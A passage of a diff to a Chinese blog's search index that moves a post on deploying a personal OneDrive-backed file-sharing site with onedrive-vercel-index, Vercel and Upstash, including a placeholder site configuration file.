-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
-<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
-<p>当然，拿它来当图床，我想也是很不错的。</p>
-<h1 id="ANINEGの网盘"><a href="#ANINEGの网盘" class="headerlink" title="ANINEGの网盘"></a>ANINEGの网盘</h1><p>最后，放上我的网盘来给大家参考一下：</p>
-<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
-<p>网盘链接：</p>
-<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>随手记</category>
-      </categories>
-      <tags>
-        <tag>Vercel</tag>
-        <tag>网盘</tag>
       </tags>
   </entry>
   <entry>
@@ -3428,6 +3428,38 @@
       </categories>
       <tags>
         <tag>隐写</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建几乎0成本的个人网盘</title>
+    <url>/2022/11/20/yunpan/</url>
+    <content><![CDATA[<h1 id="Onedrive-Vercel-Index"><a href="#Onedrive-Vercel-Index" class="headerlink" title="Onedrive-Vercel-Index"></a>Onedrive-Vercel-Index</h1><p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<del>并不需要担心你的资源会被河蟹</del>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
+<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
+<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
+<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<del>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</del>并不多。</p>
+<h1 id="搭建网盘"><a href="#搭建网盘" class="headerlink" title="搭建网盘"></a>搭建网盘</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
+<li>一台能上网的电脑</li>
+<li>一个GitHub账号</li>
+<li>一个Vercel账号</li>
+<li>一个Onedrive账号</li>
+</ul>
+<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
+<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
+<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
+<p>当然，拿它来当图床，我想也是很不错的。</p>
+<h1 id="ANINEGの网盘"><a href="#ANINEGの网盘" class="headerlink" title="ANINEGの网盘"></a>ANINEGの网盘</h1><p>最后，放上我的网盘来给大家参考一下：</p>
+<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
+<p>网盘链接：</p>
+<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
+      <tags>
+        <tag>Vercel</tag>
+        <tag>网盘</tag>
       </tags>
   </entry>
 </search>
